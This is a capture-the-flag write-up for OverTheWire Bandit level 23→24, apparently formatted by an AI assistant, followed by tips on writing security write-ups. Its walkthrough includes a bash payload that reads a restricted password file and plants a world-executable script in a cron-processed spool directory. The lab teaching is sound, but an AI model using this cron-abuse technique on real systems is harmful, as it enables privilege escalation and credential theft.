# Level 23 → Level 24

## Objective
Retrieve the password for `bandit24` by inspecting a system `cron` job and creating a custom shell script.
## Concepts Learned
- Cron job scheduling (`/etc/cron.d/`)
- Writing bash payload scripts to extract restricted files
- File permission configuration (`chmod 777`) for execution by background daemons

## Commands Used
`cat`, `mkdir`, `chmod`, `nano`, `cp`, `ls`
## Solution Walkthrough

1. **Inspect the Cron Job**
   Checked `/etc/cron.d/` to find the script scheduled for `bandit24`:
   ```bash
   cat /etc/cron.d/cronjob_bandit24
   cat /usr/bin/cronjob_bandit24.sh
##Create Payload Script

#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/my_dir/password.txt
chmod 666 /tmp/my_dir/password.txt
##Set Permissions & Execute
chmod 777 /tmp/my_dir/script.sh
cp /tmp/my_dir/script.sh /var/spool/bandit24/foo/
##Retrieve Flag
Waited 60 seconds and read the output:
cat /tmp/my_dir/password.txt
**Best Practices for Security Write-Ups**

* **Focus on the "Why":** Explain *why* a specific command or flag was chosen (e.g., `-ign_eof` for `openssl` or `-i` for `ssh`), not just the command itself.
* **Redacting Flags vs. Showing Flags:** Many platforms prefer you redact actual password strings (e.g., using `[REDACTED]`) to prevent simple copy-pasting by others, while highlighting the methodology.
* **Include Error Handling:** Documenting common errors you ran into (like `ssh: Could not resolve hostname` or permission denied errors) makes your write-up significantly more valuable to readers.

<FollowUp label="Want a Python or Bash script to automatically generate all 26 Markdown template files?" query="Can you write a script to automatically generate the 26 Markdown template files for my OverTheWire repository?"/>
